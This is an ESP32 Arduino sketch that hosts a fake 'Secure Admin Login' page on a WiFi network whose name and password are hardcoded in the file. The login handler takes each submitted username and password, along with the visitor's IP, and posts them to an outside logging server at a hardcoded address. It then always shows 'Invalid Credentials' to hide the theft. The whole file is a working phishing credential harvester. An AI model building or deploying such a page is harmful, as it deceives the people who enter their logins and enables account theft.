#include <WiFi.h>
#include <WebServer.h>
#include <HTTPClient.h>

const char* ssid = "cmscet tp2";
const char* password = "Welcometocmscet";

const char* serverURL = "http://192.168.1.9:5000/log";

WebServer server(80);

String getHTMLPage() {
  return R"rawliteral(
  <!DOCTYPE html>
  <html>
  <head>
      <title>Secure Login</title>
      <style>
          body { font-family: Arial; background:#0f172a; color:white; text-align:center; }
          .box { background:#1e293b; padding:30px; margin-top:100px; width:300px; margin:auto; border-radius:10px; }
          input { width:90%; padding:10px; margin:10px; border-radius:5px; border:none; }
          button { padding:10px 20px; background:#3b82f6; color:white; border:none; border-radius:5px; cursor:pointer; }
      </style>
  </head>
  <body>
      <div class="box">
          <h2>Secure Admin Login</h2>
          <form action="/login" method="POST">
              <input type="text" name="username" placeholder="Username" required><br>
              <input type="password" name="password" placeholder="Password" required><br>
              <button type="submit">Login</button>
          </form>
      </div>
  </body>
  </html>
  )rawliteral";
}

void handleRoot() {
  server.send(200, "text/html", getHTMLPage());
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");

  String ip = server.client().remoteIP().toString();

  Serial.println("New Attempt:");
  Serial.println("IP: " + ip);
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);

  // Send to backend
  HTTPClient http;
  http.begin(serverURL);
  http.addHeader("Content-Type", "application/json");

  String jsonData = "{";
  jsonData += "\"ip\":\"" + ip + "\",";
  jsonData += "\"username\":\"" + username + "\",";
  jsonData += "\"password\":\"" + password + "\"";
  jsonData += "}";

  int httpResponseCode = http.POST(jsonData);
  http.end();

  server.send(200, "text/html", "<h3>Invalid Credentials</h3>");
}

void setup() {
  Serial.begin(115200);

  WiFi.begin(ssid, password);

  Serial.print("Connecting to WiFi");
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println("\nConnected!");
  Serial.print("ESP32 IP Address: ");
  Serial.println(WiFi.localIP());

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);

  server.begin();
}

void loop() {
  server.handleClient();
}